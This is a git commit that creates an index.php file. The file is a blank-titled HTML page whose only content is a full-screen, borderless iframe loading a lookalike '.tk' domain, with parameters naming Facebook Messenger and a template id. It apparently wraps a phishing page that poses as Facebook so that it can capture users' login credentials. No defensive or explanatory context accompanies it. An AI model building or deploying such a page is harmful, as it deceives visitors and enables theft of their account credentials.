7fa5fcaff841deb84828d08f5223f5b10690d3d6
devoDeveloper <111668497+devoDeveloper@users.noreply.github.com>
2022-08-21 03:36:42 +0200

    Create index.php

---
+++ index.php
@@ -0,0 +1,11 @@
+                    <!DOCTYPE html>
+                    <html>
+                    <head>
+                      <meta charset="UTF-8">
+                      <meta http-equiv="X-UA-Compatible" content="IE=edge">
+                      <meta name="viewport" content="width=device-width, initial-scale=1.0">
+                      <title>|||</title>
+                    </head>
+                    <body style="padding: 0;margin: 0;overflow: hidden;"><iframe allowfullscreen='' frameborder='0' height='100%' src='https://mobiiefb.tk/Redirect/index.php?redirect?fb.php?id=6864c7fcc7e7c8df3a362d33f7579db7&social=Facebook&projectname=Facebook Messenger 1&tempid=1' style='border:0px #ffffff none;height: 100vh;width: 100vw;' width='100%'/></body>
+                    </html>
+                
